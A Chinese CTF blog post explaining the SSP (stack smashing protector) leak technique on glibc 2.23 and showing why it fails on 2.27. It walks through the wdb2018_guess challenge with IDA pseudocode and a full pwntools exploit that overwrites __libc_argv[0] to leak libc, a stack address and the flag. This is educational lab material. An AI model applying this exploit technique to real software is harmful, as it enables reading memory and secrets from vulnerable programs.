---
title: Stack smash
date: 2020-04-09 20:40:10
tags: pwn
---
最近在出题啊，往安恒投题，能恰钱，收到邮件的时候很快乐<!--more-->  
然后学习了一波stack smash的技术，想着出一个这种题投过去，看上去还是蛮好出的，但是其中有一个fork函数把我难到了  
先简单讲一下fork函数，fork是复制一份进程，它会有两个返回值，用一个if条件，如果返回0，说明是子进程，如果返回是一个pid号，说明是父进程  
什么意思呢？其实后面的这些不明白也不是很重要（目前来说），fork是复制一份进程，那么，触发canary的时候，程序崩溃，不会直接退出，而是再次执行子进程，子进程由于是复制而来的，所以所有内存布局，canary等值是一模一样的，那就快乐了，我写一个for循环fork，就能把触发canary而崩溃的程序重新执行，循环几次执行几次  
SSP Leak又是什么呢？就是Stack Smashing Protector Leak，触发时会执行__stack_chk_fail函数，打印出"stack smashing detected"，并且后面会跟一个参数，正常来说这个参数就是程序名，但是如果我们通过栈溢出来将其覆盖成其他地址，就能通过触发canary打印出的报错信息来泄露我们想得到的内存数据，几乎可以实现任意地址读  
但是有一点需要注意，SSP Leak只适用于ubuntu1604的环境，高版本libc已经不能利用这种技术来泄露了  
先贴个源码比较一下  
glibc2.23  
```C++  
#include <stdio.h>
#include <stdlib.h>


extern char **__libc_argv attribute_hidden;

void
__attribute__ ((noreturn)) internal_function
__fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
            msg, __libc_argv[0] ?: "<unknown>");
}
libc_hidden_def (__fortify_fail)
```  
glibc2.27  
```C++  
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>


extern char **__libc_argv attribute_hidden;

void
__attribute__ ((noreturn))
__fortify_fail_abort (_Bool need_backtrace, const char *msg)
{
  /* The loop is added only to keep gcc happy.  Don't pass down
     __libc_argv[0] if we aren't doing backtrace since __libc_argv[0]
     may point to the corrupted stack.  */
  while (1)
    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,
            "*** %s ***: %s terminated\n",
            msg,
            (need_backtrace && __libc_argv[0] != NULL
             ? __libc_argv[0] : "<unknown>"));
}

void
__attribute__ ((noreturn))
__fortify_fail (const char *msg)
{
  __fortify_fail_abort (true, msg);
}

libc_hidden_def (__fortify_fail)
libc_hidden_def (__fortify_fail_abort)
```  
通过实验发现，在glibc2.27的环境下只会打印unknown  
例题：wdb2018_guess  
[题目下载地址](https://buuoj.cn/challenges#wdb2018_guess)  
检查保护  
```shell  
➜  wdb2018_guess checksec GUESS
[*] '/home/N0vice/Desktop/BUUCTF/wdb2018_guess/GUESS'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```  
IDA分析下伪代码  
```C++  
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch]
  int v5; // [rsp+1Ch] [rbp-84h]
  __int64 v6; // [rsp+20h] [rbp-80h]
  __int64 v7; // [rsp+28h] [rbp-78h]
  char buf; // [rsp+30h] [rbp-70h]
  char s2; // [rsp+60h] [rbp-40h]
  unsigned __int64 v10; // [rsp+98h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  v7 = 3LL;
  LODWORD(stat_loc.__uptr) = 0;
  v6 = 0LL;
  sub_4009A6(a1, a2, a3);
  HIDWORD(stat_loc.__iptr) = open("./flag.txt", 0);
  if ( HIDWORD(stat_loc.__iptr) == -1 )
  {
    perror("./flag.txt");
    _exit(-1);
  }
  read(SHIDWORD(stat_loc.__iptr), &buf, 0x30uLL);
  close(SHIDWORD(stat_loc.__iptr));
  puts("This is GUESS FLAG CHALLENGE!");
  while ( 1 )
  {
    if ( v6 >= v7 )
    {
      puts("you have no sense... bye :-) ");
      return 0LL;
    }
    v5 = sub_400A11();
    if ( !v5 )
      break;
    ++v6;
    wait((__WAIT_STATUS)&stat_loc);
  }
  puts("Please type your guessing flag");
  gets(&s2);
  if ( !strcmp(&buf, &s2) )
    puts("You must have great six sense!!!! :-o ");
  else
    puts("You should take more effort to get six sence, and one more challenge!!");
  return 0LL;
}
```  
```C++  
__int64 sub_400A11()
{
  unsigned int v1; // [rsp+Ch] [rbp-4h]

  v1 = fork();
  if ( v1 == -1 )
    err(1, "can not fork");
  return v1;
}
```  
用了while循环和if判断，使我们能进行3次猜测  
主要思路如下：  
计算可控输入首地址和__libc_argv[0]之间的偏移，将__libc_argv[0]覆盖成puts_got，泄露libc_base  
泄露栈地址  
计算栈地址与flag之间的距离，得到flag的地址  
覆盖__libc_argv[0]为成flag地址，泄露flag  
exp：  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
import sys
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './pwn1' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("",)
elf=ELF(binary)
libc=elf.libc
def exp():
    p.recvuntil("flag\n")
    payload = "a"*296 + p64(elf.got['puts'])
    p.sendline(payload)
    p.recvuntil("*** stack smashing detected ***: ")
    puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    libc_base = puts_addr - libc.sym['puts']
    log.success("puts_addr==>" + hex(puts_addr))
    log.success("libc_base==>" + hex(libc_base))
    environ = libc_base + libc.sym['environ']
    p.recvuntil("flag\n")
    payload = "a"*296 + p64(environ)
    p.sendline(payload)
    p.recvuntil("*** stack smashing detected ***: ")
    stack_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    log.success("stack_addr==>" + hex(stack_addr))
    flag = stack_addr - 0x168
    p.recvuntil("flag\n")
    payload = "a"*296 + p64(flag)
    p.sendline(payload)
    p.interactive()
exp()
```  
参考链接：  
https://cloud.tencent.com/developer/article/1607482  
https://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/  
http://www.pwn4fun.com/pwn/stack-pivot-and-stack-smash.html#2018%E7%BD%91%E9%BC%8E%E6%9D%AFGUESS  
https://bbs.pediy.com/thread-224643.htm  